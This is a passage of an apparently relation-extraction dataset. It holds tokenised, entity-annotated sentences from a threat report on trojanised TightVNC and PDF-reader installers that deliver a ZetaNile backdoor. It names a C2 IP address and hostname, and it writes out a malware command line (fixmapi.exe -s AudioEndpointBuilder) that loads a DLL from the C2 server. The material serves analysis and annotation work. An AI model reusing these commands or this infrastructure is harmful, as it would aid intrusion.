[27, 29], "index": "10_0"}], [{"type": "TF", "sent_id": 2, "global_pos": [99, 99], "name": "hardcoded value", "pos": [31, 33], "index": "11_0"}], [{"type": "TF", "sent_id": 3, "global_pos": [116, 116], "name": "PDBPath", "pos": [5, 6], "index": "12_0"}], [{"type": "TF", "sent_id": 4, "global_pos": [127, 127], "name": "ReadMe.txt", "pos": [9, 10], "index": "13_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [130, 130], "name": "executable file", "pos": [12, 14], "index": "14_0"}], [{"type": "TF", "sent_id": 5, "global_pos": [136, 136], "name": ".txt file", "pos": [1, 3], "index": "15_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [161, 161], "name": "TightVNC Viewer", "pos": [18, 20], "index": "16_0"}], [{"type": "SO", "sent_id": 6, "global_pos": [168, 168], "name": "remote hosts", "pos": [25, 27], "index": "17_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [179, 179], "name": "backdoor", "pos": [36, 37], "index": "18_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [185, 185], "name": "ec2-aet-tech.w-ada.amazonaws", "pos": [42, 43], "index": "19_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [192, 192], "name": "TightVNC Viewer", "pos": [49, 51], "index": "20_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [202, 202], "name": "malware", "pos": [1, 2], "index": "21_0"}], [{"type": "SO", "sent_id": 7, "global_pos": [213, 213], "name": "44.238.74.84", "pos": [12, 13], "index": "22_0"}], [{"type": "SO", "sent_id": 7, "global_pos": [232, 232], "name": "IP", "pos": [31, 32], "index": "23_0"}]], "labels": [{"r": "ST", "evidence": [0, 1], "h": 0, "t": 3}, {"r": "RF", "evidence": [0, 1], "h": 0, "t": 3}, {"r": "ST", "evidence": [0, 1], "h": 1, "t": 3}, {"r": "RF", "evidence": [0, 1], "h": 1, "t": 3}, {"r": "ST", "evidence": [1], "h": 2, "t": 3}, {"r": "RF", "evidence": [1], "h": 2, "t": 3}, {"r": "FR", "evidence": [1], "h": 4, "t": 5}, {"r": "EX", "evidence": [1], "h": 5, "t": 6}, {"r": "RD", "evidence": [1], "h": 5, "t": 7}, {"r": "RF", "evidence": [1], "h": 5, "t": 8}, {"r": "WR", "evidence": [1, 2], "h": 5, "t": 9}, {"r": "WR", "evidence": [1, 2, 3, 4], "h": 5, "t": 14}, {"r": "WR", "evidence": [2, 3, 4, 5, 6], "t": 9, "h": 16}, {"r": "WR", "evidence": [4, 5, 6], "t": 14, "h": 16}, {"r": "ST", "evidence": [6], "h": 16, "t": 17}, {"r": "RF", "evidence": [6], "h": 16, "t": 17}, {"r": "FR", "evidence": [6], "h": 16, "t": 18}, {"r": "ST", "evidence": [6], "t": 17, "h": 18}, {"r": "RF", "evidence": [6], "t": 17, "h": 18}, {"r": "WR", "evidence": [6], "h": 18, "t": 19}, {"r": "WR", "evidence": [6], "t": 19, "h": 20}, {"r": "WR", "evidence": [6], "t": 19, "h": 20}, {"r": "ST", "evidence": [6, 7], "h": 20, "t": 22}, {"r": "RF", "evidence": [6, 7], "h": 20, "t": 22}, {"r": "ST", "evidence": [7], "h": 21, "t": 22}, {"r": "RF", "evidence": [7], "h": 21, "t": 22}, {"r": "ST", "evidence": [7], "h": 21, "t": 23}, {"r": "RF", "evidence": [7], "h": 21, "t": 23}, {"r": "CO", "evidence": [7], "h": 22, "t": 23}]}, {"title": "052-21", "sents": [["The", "mscoree.dll", "malware", "is", "modularized", "in", "such", "a", "way", "that", ",", "upon", "successful", "connection", "to", "the", "compromised", "C2", "domain", ",", "the", "attackers", "can", "install", "additional", "malware", "on", "the", "target", "system", "as", "needed", "using", "the", "existing", "C2", "communication", ",", "such", "as", "executing", "C", ":", "\\ProgramData\\Cisco\\fixmapi.exe", "-s", "AudioEndpointBuilder", "to", "load", "malicious", "mapistub.dll", "from", "the", "compromised", "C2", "server", "."], ["The", "HTTP", "POST", "requests", "contain", "the", "hardcoded", "user", "agent", "string", "with", "misspelled", "``", "Edge", "''", ",", "as", "detailed", "below", ",", "and", "contain", "a", "unique", "ID", "for", "the", "field", "gametype", "and", "the", "hardcoded", "value", "for", "the", "field", "type", "for", "malware", "campaign", "tracking", "purposes", ":"], ["This", "malware", "has", "a", "unique", "PDBPath", ":"], ["Within", "that", "archive", ",", "the", "recipient", "is", "provided", "a", "ReadMe.txt", "and", "an", "executable", "file", "to", "run", "."], ["The", ".txt", "file", "has", "the", "following", "content", ":"], ["As", "part", "of", "the", "threat", "actor", "'", "s", "latest", "malware", "technique", "to", "evade", "traditional", "defenses", ",", "the", "malicious", "TightVNC", "Viewer", "has", "a", "pre-populated", "list", "of", "remote", "hosts", ",", "and", "it", "'", "s", "configured", "to", "install", "the", "backdoor", "only", "when", "the", "user", "selects", "ec2-aet-tech.w-ada.amazonaws", "from", "the", "drop-down", "menu", "in", "the", "TightVNC", "Viewer", ",", "as", "shown", "in", "Figure", "5", ":"], ["The", "malware", "was", "configured", "to", "send", "the", "username", "and", "hostname", "to", "IP", "44.238.74.84", "on", "TCP/22", "as", "part", "of", "the", "victim", "check-in", "with", "the", "C2", "and", "establish", "VNC", "connections", "to", "the", "same", "IP", "on", "port", "TCP/5900", "."], ["Once", "a", "successful", "connection", "is", "established", "to", "the", "server", "IP", ",", "the", "embedded", "second", "stage", "DLL", "payload", "from", "TightVNC.exe", "is", "loaded", "in", "memory", "to", "establish", "C2", "communication", "to", "a", "known", "compromised", "domain", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [1, 1], "name": "mscoree.dll malware", "pos": [1, 3], "index": "0_0"}], [{"type": "SO", "sent_id": 0, "global_pos": [17, 17], "name": "C2 domain", "pos": [17, 19], "index": "1_0"}], [{"type": "MP", "sent_id": 0, "global_pos": [21, 21], "name": "attackers", "pos": [21, 22], "index": "2_0"}], [{"type": "MP", "sent_id": 0, "global_pos": [25, 25], "name": "malware", "pos": [25, 26], "index": "3_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [41, 41], "name": "C : \\ProgramData\\Cisco\\fixmapi.exe", "pos": [41, 44], "index": "4_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [49, 49], "name": "mapistub.dll", "pos": [49, 50], "index": "5_0"}], [{"type": "SO", "sent_id": 0, "global_pos": [53, 53], "name": "C2 server", "pos": [53, 55], "index": "6_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [57, 57], "name": "HTTP POST requests", "pos": [1, 4], "index": "7_0"}], [{"type": "TF", "sent_id": 1, "global_pos": [83, 83], "name": "field gametype", "pos": [27, 29], "index": "8_0"}], [{"type": "TF", "sent_id": 1, "global_pos": [87, 87], "name": "hardcoded value", "pos": [31, 33], "index": "9_0"}], [{"type": "TF", "sent_id": 2, "global_pos": [104, 104], "name": "PDBPath", "pos": [5, 6], "index": "10_0"}], [{"type": "TF", "sent_id": 3, "global_pos": [115, 115], "name": "ReadMe.txt", "pos": [9, 10], "index": "11_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [118, 118], "name": "executable file", "pos": [12, 14], "index": "12_0"}], [{"type": "TF", "sent_id": 4, "global_pos": [124, 124], "name": ".txt file", "pos": [1, 3], "index": "13_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [149, 149], "name": "TightVNC Viewer", "pos": [18, 20], "index": "14_0"}], [{"type": "SO", "sent_id": 5, "global_pos": [156, 156], "name": "remote hosts", "pos": [25, 27], "index": "15_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [167, 167], "name": "backdoor", "pos": [36, 37], "index": "16_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [173, 173], "name": "ec2-aet-tech.w-ada.amazonaws", "pos": [42, 43], "index": "17_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [180, 180], "name": "TightVNC Viewer", "pos": [49, 51], "index": "18_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [190, 190], "name": "malware", "pos": [1, 2], "index": "19_0"}], [{"type": "SO", "sent_id": 6, "global_pos": [201, 201], "name": "44.238.74.84", "pos": [12, 13], "index": "20_0"}], [{"type": "SO", "sent_id": 6, "global_pos": [220, 220], "name": "IP", "pos": [31, 32], "index": "21_0"}], [{"type": "SO", "sent_id": 7, "global_pos": [233, 233], "name": "server IP", "pos": [8, 10], "index": "22_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [240, 240], "name": "DLL payload", "pos": [15, 17], "index": "23_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [243, 243], "name": "TightVNC.exe", "pos": [18, 19], "index": "24_0"}]], "labels": [{"r": "ST", "evidence": [0], "h": 0, "t": 1}, {"r": "RF", "evidence": [0], "h": 0, "t": 1}, {"r": "FR", "evidence": [0], "h": 2, "t": 3}, {"r": "EX", "evidence": [0], "h": 3, "t": 4}, {"r": "RD", "evidence": [0], "h": 3, "t": 5}, {"r": "RF", "evidence": [0], "h": 3, "t": 6}, {"r": "WR", "evidence": [0, 1], "h": 3, "t": 7}, {"r": "WR", "evidence": [0, 1, 2, 3], "h": 3, "t": 12}, {"r": "WR", "evidence": [1, 2, 3, 4, 5], "t": 7, "h": 14}, {"r": "WR", "evidence": [3, 4, 5], "t": 12, "h": 14}, {"r": "ST", "evidence": [5], "h": 14, "t": 15}, {"r": "RF", "evidence": [5], "h": 14, "t": 15}, {"r": "FR", "evidence": [5], "h": 14, "t": 16}, {"r": "ST", "evidence": [5], "t": 15, "h": 16}, {"r": "RF", "evidence": [5], "t": 15, "h": 16}, {"r": "WR", "evidence": [5], "h": 16, "t": 17}, {"r": "WR", "evidence": [5], "t": 17, "h": 18}, {"r": "WR", "evidence": [5], "t": 17, "h": 18}, {"r": "ST", "evidence": [5, 6], "h": 18, "t": 20}, {"r": "RF", "evidence": [5, 6], "h": 18, "t": 20}, {"r": "ST", "evidence": [6], "h": 19, "t": 20}, {"r": "RF", "evidence": [6], "h": 19, "t": 20}, {"r": "ST", "evidence": [6], "h": 19, "t": 21}, {"r": "RF", "evidence": [6], "h": 19, "t": 21}, {"r": "ST", "evidence": [6, 7], "h": 19, "t": 22}, {"r": "RF", "evidence": [6, 7], "h": 19, "t": 22}, {"r": "RD", "evidence": [6, 7], "h": 19, "t": 23}, {"r": "CO", "evidence": [6], "h": 20, "t": 21}, {"r": "WR", "evidence": [7], "t": 23, "h": 24}]}, {"title": "052-22", "sents": [["The", "HTTP", "POST", "requests", "contain", "the", "hardcoded", "user", "agent", "string", "with", "misspelled", "``", "Edge", "''", ",", "as", "detailed", "below", ",", "and", "contain", "a", "unique", "ID", "for", "the", "field", "gametype", "and", "the", "hardcoded", "value", "for", "the", "field", "type", "for", "malware", "campaign", "tracking", "purposes", ":"], ["This", "malware", "has", "a", "unique", "PDBPath", ":"], ["Within", "that", "archive", ",", "the", "recipient", "is", "provided", "a", "ReadMe.txt", "and", "an", "executable", "file", "to", "run", "."], ["The", ".txt", "file", "has", "the", "following", "content", ":"], ["As", "part", "of", "the", "threat", "actor", "'", "s", "latest", "malware", "technique", "to", "evade", "traditional", "defenses", ",", "the", "malicious", "TightVNC", "Viewer", "has", "a", "pre-populated", "list", "of", "remote", "hosts", ",", "and", "it", "'", "s", "configured", "to", "install", "the", "backdoor", "only", "when", "the", "user", "selects", "ec2-aet-tech.w-ada.amazonaws", "from", "the", "drop-down", "menu", "in", "the", "TightVNC", "Viewer", ",", "as", "shown", "in", "Figure", "5", ":"], ["The", "malware", "was", "configured", "to", "send", "the", "username", "and", "hostname", "to", "IP", "44.238.74.84", "on", "TCP/22", "as", "part", "of", "the", "victim", "check-in", "with", "the", "C2", "and", "establish", "VNC", "connections", "to", "the", "same", "IP", "on", "port", "TCP/5900", "."], ["Once", "a", "successful", "connection", "is", "established", "to", "the", "server", "IP", ",", "the", "embedded", "second", "stage", "DLL", "payload", "from", "TightVNC.exe", "is", "loaded", "in", "memory", "to", "establish", "C2", "communication", "to", "a", "known", "compromised", "domain", "."], ["Within", "that", "archive", ",", "the", "recipient", "is", "provided", "with", "an", "executable", "file", "to", "run", "."]], "vertexSet": [[{"type": "MF", "sent_id": 0, "global_pos": [1, 1], "name": "HTTP POST requests", "pos": [1, 4], "index": "0_0"}], [{"type": "TF", "sent_id": 0, "global_pos": [27, 27], "name": "field gametype", "pos": [27, 29], "index": "1_0"}], [{"type": "TF", "sent_id": 0, "global_pos": [31, 31], "name": "hardcoded value", "pos": [31, 33], "index": "2_0"}], [{"type": "TF", "sent_id": 1, "global_pos": [48, 48], "name": "PDBPath", "pos": [5, 6], "index": "3_0"}], [{"type": "TF", "sent_id": 2, "global_pos": [59, 59], "name": "ReadMe.txt", "pos": [9, 10], "index": "4_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [62, 62], "name": "executable file", "pos": [12, 14], "index": "5_0"}], [{"type": "TF", "sent_id": 3, "global_pos": [68, 68], "name": ".txt file", "pos": [1, 3], "index": "6_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [93, 93], "name": "TightVNC Viewer", "pos": [18, 20], "index": "7_0"}], [{"type": "SO", "sent_id": 4, "global_pos": [100, 100], "name": "remote hosts", "pos": [25, 27], "index": "8_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [111, 111], "name": "backdoor", "pos": [36, 37], "index": "9_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [117, 117], "name": "ec2-aet-tech.w-ada.amazonaws", "pos": [42, 43], "index": "10_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [124, 124], "name": "TightVNC Viewer", "pos": [49, 51], "index": "11_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [134, 134], "name": "malware", "pos": [1, 2], "index": "12_0"}], [{"type": "SO", "sent_id": 5, "global_pos": [145, 145], "name": "44.238.74.84", "pos": [12, 13], "index": "13_0"}], [{"type": "SO", "sent_id": 5, "global_pos": [164, 164], "name": "IP", "pos": [31, 32], "index": "14_0"}], [{"type": "SO", "sent_id": 6, "global_pos": [177, 177], "name": "server IP", "pos": [8, 10], "index": "15_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [184, 184], "name": "DLL payload", "pos": [15, 17], "index": "16_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [187, 187], "name": "TightVNC.exe", "pos": [18, 19], "index": "17_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [207, 207], "name": "recipient", "pos": [5, 6], "index": "18_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [212, 212], "name": "executable file", "pos": [10, 12], "index": "19_0"}]], "labels": [{"r": "WR", "evidence": [0, 1, 2, 3, 4], "t": 0, "h": 7}, {"r": "WR", "evidence": [2, 3, 4], "t": 5, "h": 7}, {"r": "ST", "evidence": [4], "h": 7, "t": 8}, {"r": "RF", "evidence": [4], "h": 7, "t": 8}, {"r": "FR", "evidence": [4], "h": 7, "t": 9}, {"r": "ST", "evidence": [4], "t": 8, "h": 9}, {"r": "RF", "evidence": [4], "t": 8, "h": 9}, {"r": "WR", "evidence": [4], "h": 9, "t": 10}, {"r": "WR", "evidence": [4], "t": 10, "h": 11}, {"r": "WR", "evidence": [4], "t": 10, "h": 11}, {"r": "ST", "evidence": [4, 5], "h": 11, "t": 13}, {"r": "RF", "evidence": [4, 5], "h": 11, "t": 13}, {"r": "ST", "evidence": [5], "h": 12, "t": 13}, {"r": "RF", "evidence": [5], "h": 12, "t": 13}, {"r": "ST", "evidence": [5], "h": 12, "t": 14}, {"r": "RF", "evidence": [5], "h": 12, "t": 14}, {"r": "ST", "evidence": [5, 6], "h": 12, "t": 15}, {"r": "RF", "evidence": [5, 6], "h": 12, "t": 15}, {"r": "RD", "evidence": [5, 6], "h": 12, "t": 16}, {"r": "CO", "evidence": [5], "h": 13, "t": 14}, {"r": "WR", "evidence": [6], "t": 16, "h": 17}, {"r": "EX", "evidence": [7], "h": 18, "t": 19}]}, {"title": "052-23", "sents": [["This", "malware", "has", "a", "unique", "PDBPath", ":"], ["Within", "that", "archive", ",", "the", "recipient", "is", "provided", "a", "ReadMe.txt", "and", "an", "executable", "file", "to", "run", "."], ["The", ".txt", "file", "has", "the", "following", "content", ":"], ["As", "part", "of", "the", "threat", "actor", "'", "s", "latest", "malware", "technique", "to", "evade", "traditional", "defenses", ",", "the", "malicious", "TightVNC", "Viewer", "has", "a", "pre-populated", "list", "of", "remote", "hosts", ",", "and", "it", "'", "s", "configured", "to", "install", "the", "backdoor", "only", "when", "the", "user", "selects", "ec2-aet-tech.w-ada.amazonaws", "from", "the", "drop-down", "menu", "in", "the", "TightVNC", "Viewer", ",", "as", "shown", "in", "Figure", "5", ":"], ["The", "malware", "was", "configured", "to", "send", "the", "username", "and", "hostname", "to", "IP", "44.238.74.84", "on", "TCP/22", "as", "part", "of", "the", "victim", "check-in", "with", "the", "C2", "and", "establish", "VNC", "connections", "to", "the", "same", "IP", "on", "port", "TCP/5900", "."], ["Once", "a", "successful", "connection", "is", "established", "to", "the", "server", "IP", ",", "the", "embedded", "second", "stage", "DLL", "payload", "from", "TightVNC.exe", "is", "loaded", "in", "memory", "to", "establish", "C2", "communication", "to", "a", "known", "compromised", "domain", "."], ["Within", "that", "archive", ",", "the", "recipient", "is", "provided", "with", "an", "executable", "file", "to", "run", "."], ["While", "the", "malicious", "Sumatra", "PDF", "reader", "is", "a", "fully", "functional", "PDF", "reader", "that", "can", "load", "the", "malicious", "implant", "from", "a", "fake", "PDF", ",", "the", "muPDF/Subliminal", "Recording", "installer", "can", "set", "up", "the", "backdoor", "without", "loading", "any", "malicious", "PDF", "files", "."]], "vertexSet": [[{"type": "TF", "sent_id": 0, "global_pos": [5, 5], "name": "PDBPath", "pos": [5, 6], "index": "0_0"}], [{"type": "TF", "sent_id": 1, "global_pos": [16, 16], "name": "ReadMe.txt", "pos": [9, 10], "index": "1_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [19, 19], "name": "executable file", "pos": [12, 14], "index": "2_0"}], [{"type": "TF", "sent_id": 2, "global_pos": [25, 25], "name": ".txt file", "pos": [1, 3], "index": "3_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [50, 50], "name": "TightVNC Viewer", "pos": [18, 20], "index": "4_0"}], [{"type": "SO", "sent_id": 3, "global_pos": [57, 57], "name": "remote hosts", "pos": [25, 27], "index": "5_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [68, 68], "name": "backdoor", "pos": [36, 37], "index": "6_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [74, 74], "name": "ec2-aet-tech.w-ada.amazonaws", "pos": [42, 43], "index": "7_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [81, 81], "name": "TightVNC Viewer", "pos": [49, 51], "index": "8_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [91, 91], "name": "malware", "pos": [1, 2], "index": "9_0"}], [{"type": "SO", "sent_id": 4, "global_pos": [102, 102], "name": "44.238.74.84", "pos": [12, 13], "index": "10_0"}], [{"type": "SO", "sent_id": 4, "global_pos": [121, 121], "name": "IP", "pos": [31, 32], "index": "11_0"}], [{"type": "SO", "sent_id": 5, "global_pos": [134, 134], "name": "server IP", "pos": [8, 10], "index": "12_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [141, 141], "name": "DLL payload", "pos": [15, 17], "index": "13_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [144, 144], "name": "TightVNC.exe", "pos": [18, 19], "index": "14_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [164, 164], "name": "recipient", "pos": [5, 6], "index": "15_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [169, 169], "name": "executable file", "pos": [10, 12], "index": "16_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [177, 177], "name": "Sumatra PDF reader", "pos": [3, 6], "index": "17_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [191, 191], "name": "implant", "pos": [17, 18], "index": "18_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [198, 198], "name": "muPDF/Subliminal Recording installer", "pos": [24, 27], "index": "19_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [205, 205], "name": "backdoor", "pos": [31, 32], "index": "20_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [210, 210], "name": "PDF files", "pos": [36, 38], "index": "21_0"}]], "labels": [{"r": "WR", "evidence": [1, 2, 3], "t": 2, "h": 4}, {"r": "ST", "evidence": [3], "h": 4, "t": 5}, {"r": "RF", "evidence": [3], "h": 4, "t": 5}, {"r": "FR", "evidence": [3], "h": 4, "t": 6}, {"r": "ST", "evidence": [3], "t": 5, "h": 6}, {"r": "RF", "evidence": [3], "t": 5, "h": 6}, {"r": "WR", "evidence": [3], "h": 6, "t": 7}, {"r": "WR", "evidence": [3], "t": 7, "h": 8}, {"r": "WR", "evidence": [3], "t": 7, "h": 8}, {"r": "ST", "evidence": [3, 4], "h": 8, "t": 10}, {"r": "RF", "evidence": [3, 4], "h": 8, "t": 10}, {"r": "ST", "evidence": [4], "h": 9, "t": 10}, {"r": "RF", "evidence": [4], "h": 9, "t": 10}, {"r": "ST", "evidence": [4], "h": 9, "t": 11}, {"r": "RF", "evidence": [4], "h": 9, "t": 11}, {"r": "ST", "evidence": [4, 5], "h": 9, "t": 12}, {"r": "RF", "evidence": [4, 5], "h": 9, "t": 12}, {"r": "RD", "evidence": [4, 5], "h": 9, "t": 13}, {"r": "CO", "evidence": [4], "h": 10, "t": 11}, {"r": "WR", "evidence": [5], "t": 13, "h": 14}, {"r": "EX", "evidence": [6], "h": 15, "t": 16}, {"r": "RD", "evidence": [7], "h": 17, "t": 18}, {"r": "FR", "evidence": [7], "h": 19, "t": 20}, {"r": "WR", "evidence": [7], "h": 20, "t": 21}]}, {"title": "052-24", "sents": [["Within", "that", "archive", ",", "the", "recipient", "is", "provided", "a", "ReadMe.txt", "and", "an", "executable", "file", "to", "run", "."], ["The", ".txt", "file", "has", "the", "following", "content", ":"], ["As", "part", "of", "the", "threat", "actor", "'", "s", "latest", "malware", "technique", "to", "evade", "traditional", "defenses", ",", "the", "malicious", "TightVNC", "Viewer", "has", "a", "pre-populated", "list", "of", "remote", "hosts", ",", "and", "it", "'", "s", "configured", "to", "install", "the", "backdoor", "only", "when", "the", "user", "selects", "ec2-aet-tech.w-ada.amazonaws", "from", "the", "drop-down", "menu", "in", "the", "TightVNC", "Viewer", ",", "as", "shown", "in", "Figure", "5", ":"], ["The", "malware", "was", "configured", "to", "send", "the", "username", "and", "hostname", "to", "IP", "44.238.74.84", "on", "TCP/22", "as", "part", "of", "the", "victim", "check-in", "with", "the", "C2", "and", "establish", "VNC", "connections", "to", "the", "same", "IP", "on", "port", "TCP/5900", "."], ["Once", "a", "successful", "connection", "is", "established", "to", "the", "server", "IP", ",", "the", "embedded", "second", "stage", "DLL", "payload", "from", "TightVNC.exe", "is", "loaded", "in", "memory", "to", "establish", "C2", "communication", "to", "a", "known", "compromised", "domain", "."], ["Within", "that", "archive", ",", "the", "recipient", "is", "provided", "with", "an", "executable", "file", "to", "run", "."], ["While", "the", "malicious", "Sumatra", "PDF", "reader", "is", "a", "fully", "functional", "PDF", "reader", "that", "can", "load", "the", "malicious", "implant", "from", "a", "fake", "PDF", ",", "the", "muPDF/Subliminal", "Recording", "installer", "can", "set", "up", "the", "backdoor", "without", "loading", "any", "malicious", "PDF", "files", "."], ["SecurePDF.exe", "is", "a", "modularized", "loader", "that", "can", "install", "the", "ZetaNile", "implant", "by", "loading", "a", "weaponized", "job", "application", "themed", "file", "with", "a", ".PDF", "extension", "."]], "vertexSet": [[{"type": "TF", "sent_id": 0, "global_pos": [9, 9], "name": "ReadMe.txt", "pos": [9, 10], "index": "0_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [12, 12], "name": "executable file", "pos": [12, 14], "index": "1_0"}], [{"type": "TF", "sent_id": 1, "global_pos": [18, 18], "name": ".txt file", "pos": [1, 3], "index": "2_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [43, 43], "name": "TightVNC Viewer", "pos": [18, 20], "index": "3_0"}], [{"type": "SO", "sent_id": 2, "global_pos": [50, 50], "name": "remote hosts", "pos": [25, 27], "index": "4_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [61, 61], "name": "backdoor", "pos": [36, 37], "index": "5_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [67, 67], "name": "ec2-aet-tech.w-ada.amazonaws", "pos": [42, 43], "index": "6_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [74, 74], "name": "TightVNC Viewer", "pos": [49, 51], "index": "7_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [84, 84], "name": "malware", "pos": [1, 2], "index": "8_0"}], [{"type": "SO", "sent_id": 3, "global_pos": [95, 95], "name": "44.238.74.84", "pos": [12, 13], "index": "9_0"}], [{"type": "SO", "sent_id": 3, "global_pos": [114, 114], "name": "IP", "pos": [31, 32], "index": "10_0"}], [{"type": "SO", "sent_id": 4, "global_pos": [127, 127], "name": "server IP", "pos": [8, 10], "index": "11_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [134, 134], "name": "DLL payload", "pos": [15, 17], "index": "12_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [137, 137], "name": "TightVNC.exe", "pos": [18, 19], "index": "13_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [157, 157], "name": "recipient", "pos": [5, 6], "index": "14_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [162, 162], "name": "executable file", "pos": [10, 12], "index": "15_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [170, 170], "name": "Sumatra PDF reader", "pos": [3, 6], "index": "16_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [184, 184], "name": "implant", "pos": [17, 18], "index": "17_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [191, 191], "name": "muPDF/Subliminal Recording installer", "pos": [24, 27], "index": "18_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [198, 198], "name": "backdoor", "pos": [31, 32], "index": "19_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [203, 203], "name": "PDF files", "pos": [36, 38], "index": "20_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [206, 206], "name": "SecurePDF.exe", "pos": [0, 1], "index": "21_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [215, 215], "name": "ZetaNile implant", "pos": [9, 11], "index": "22_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [223, 223], "name": "themed file", "pos": [17, 19], "index": "23_0"}]], "labels": [{"r": "WR", "evidence": [0, 1, 2], "t": 1, "h": 3}, {"r": "ST", "evidence": [2], "h": 3, "t": 4}, {"r": "RF", "evidence": [2], "h": 3, "t": 4}, {"r": "FR", "evidence": [2], "h": 3, "t": 5}, {"r": "ST", "evidence": [2], "t": 4, "h": 5}, {"r": "RF", "evidence": [2], "t": 4, "h": 5}, {"r": "WR", "evidence": [2], "h": 5, "t": 6}, {"r": "WR", "evidence": [2], "t": 6, "h": 7}, {"r": "WR", "evidence": [2], "t": 6, "h": 7}, {"r": "ST", "evidence": [2, 3], "h": 7, "t": 9}, {"r": "RF", "evidence": [2, 3], "h": 7, "t": 9}, {"r": "ST", "evidence": [3], "h": 8, "t": 9}, {"r": "RF", "evidence": [3], "h": 8, "t": 9}, {"r": "ST", "evidence": [3], "h": 8, "t": 10}, {"r": "RF", "evidence": [3], "h": 8, "t": 10}, {"r": "ST", "evidence": [3, 4], "h": 8, "t": 11}, {"r": "RF", "evidence": [3, 4], "h": 8, "t": 11}, {"r": "RD", "evidence": [3, 4], "h": 8, "t": 12}, {"r": "CO", "evidence": [3], "h": 9, "t": 10}, {"r": "WR", "evidence": [4], "t": 12, "h": 13}, {"r": "EX", "evidence": [5], "h": 14, "t": 15}, {"r": "RD", "evidence": [6], "h": 16, "t": 17}, {"r": "FR", "evidence": [6], "h": 18, "t": 19}, {"r": "WR", "evidence": [6], "h": 19, "t": 20}, {"r": "WR", "evidence": [6, 7], "t": 20, "h": 21}, {"r": "FR", "evidence": [7], "h": 21, "t": 22}, {"r": "RD", "evidence": [7], "h": 21, "t": 23}]}, {"title": "052-25", "sents": [["The", ".txt", "file", "has", "the", "following", "content", ":"], ["As", "part", "of", "the", "threat", "actor", "'", "s", "latest", "malware", "technique", "to", "evade", "traditional", "defenses", ",", "the", "malicious", "TightVNC", "Viewer", "has", "a", "pre-populated", "list", "of", "remote", "hosts", ",", "and", "it", "'", "s", "configured", "to", "install", "the", "backdoor", "only", "when", "the", "user", "selects", "ec2-aet-tech.w-ada.amazonaws", "from", "the", "drop-down", "menu", "in", "the", "TightVNC", "Viewer", ",", "as", "shown", "in", "Figure", "5", ":"], ["The", "malware", "was", "configured", "to", "send", "the", "username", "and", "hostname", "to", "IP", "44.238.74.84", "on", "TCP/22", "as", "part", "of", "the", "victim", "check-in", "with", "the", "C2", "and", "establish", "VNC", "connections", "to", "the", "same", "IP", "on", "port", "TCP/5900", "."], ["Once", "a", "successful", "connection", "is", "established", "to", "the", "server", "IP", ",", "the", "embedded", "second", "stage", "DLL", "payload", "from", "TightVNC.exe", "is", "loaded", "in", "memory", "to", "establish", "C2", "communication", "to", "a", "known", "compromised", "domain", "."], ["Within", "that", "archive", ",", "the", "recipient", "is", "provided", "with", "an", "executable", "file", "to", "run", "."], ["While", "the", "malicious", "Sumatra", "PDF", "reader", "is", "a", "fully", "functional", "PDF", "reader", "that", "can", "load", "the", "malicious", "implant", "from", "a", "fake", "PDF", ",", "the", "muPDF/Subliminal", "Recording", "installer", "can", "set", "up", "the", "backdoor", "without", "loading", "any", "malicious", "PDF", "files", "."], ["SecurePDF.exe", "is", "a", "modularized", "loader", "that", "can", "install", "the", "ZetaNile", "implant", "by", "loading", "a", "weaponized", "job", "application", "themed", "file", "with", "a", ".PDF", "extension", "."], ["The", "fake", "PDF", "contains", "a", "header", "``", "SPV005", "''", ",", "a", 